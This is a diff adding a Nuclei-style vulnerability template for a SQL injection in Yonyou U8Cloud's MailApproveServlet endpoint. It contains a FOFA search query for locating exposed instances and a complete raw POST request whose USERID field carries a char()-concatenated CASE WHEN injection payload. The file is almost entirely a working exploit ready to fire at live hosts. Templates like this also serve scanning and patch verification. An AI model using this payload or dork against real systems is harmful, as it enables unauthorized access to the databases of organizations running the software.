@@ -1,0 +1,28 @@
+id: poc-ilm7glnhgb661xdn
+info:
+  name: 用友U8Cloud nc.bs.pf.pub.MailApproveServlet存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ilm7glnhgb661xdn'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ilm7glnhgb661xdn
+    fofa: title=="U8C"
+http:
+- raw:
+  - 'POST /service/~uap/nc.bs.pf.pub.MailApproveServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    NEEDDISPATCH=&BILLID=1&BILLTYPE=BJ&USERID=admin'' AND 1402=(char(113)||char(122)||char(122)||char(112)||char(113)||(CASE WHEN (1402=1402) THEN char(49) ELSE char(48) END)||char(113)||char(112)||char(112)||char(122)||char(113))-- ARhW&PASSWORD=admin&RESULT=APPROVED&DATASOURCE=U8cloud'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
